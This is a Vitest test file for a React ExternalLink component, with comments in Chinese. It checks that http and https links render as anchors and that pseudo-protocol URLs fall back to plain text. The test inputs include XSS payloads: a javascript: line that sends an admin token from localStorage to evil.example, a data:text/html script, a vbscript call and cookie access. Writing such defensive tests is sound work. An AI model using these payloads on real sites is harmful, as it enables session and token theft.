// @vitest-environment jsdom
//
// 外链协议白名单守护：provider_url / website_url 来自服务商自助提交，
// 2026-07-25 的探测流量里出现过 javascript: 与 data:text/html 载荷（目标是
// 读取 localStorage 里的 admin token）。后端已在入口与落盘两处拒掉，
// 这里锁住前端这道纵深防御——伪协议必须降级为纯文本，绝不进 <a href>。
import { act } from 'react';
import { createRoot } from 'react-dom/client';
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { ExternalLink } from './ExternalLink';

vi.mock('react-i18next', () => ({
  useTranslation: () => ({ t: (key: string) => key }),
}));

vi.mock('../utils/analytics', () => ({ trackEvent: () => {} }));

let container: HTMLDivElement;
let root: ReturnType<typeof createRoot>;

beforeEach(() => {
  container = document.createElement('div');
  document.body.appendChild(container);
  root = createRoot(container);
});

afterEach(() => {
  act(() => root.unmount());
  container.remove();
});

function render(href: string) {
  act(() => {
    root.render(<ExternalLink href={href}>链接文字</ExternalLink>);
  });
}

describe('ExternalLink 协议白名单', () => {
  it.each(['https://example.com', 'http://example.com'])('%s 渲染为可点击外链', href => {
    render(href);
    const anchor = container.querySelector('a');
    expect(anchor).not.toBeNull();
    expect(anchor?.getAttribute('href')).toBe(href);
  });

  it.each([
    'javascript:alert(document.cookie)',
    "javascript:fetch('https://evil.example/?t='+localStorage.getItem('relay-pulse-admin-token'))",
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'not a url at all',
  ])('%s 降级为纯文本', href => {
    render(href);
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain('链接文字');
  });
});
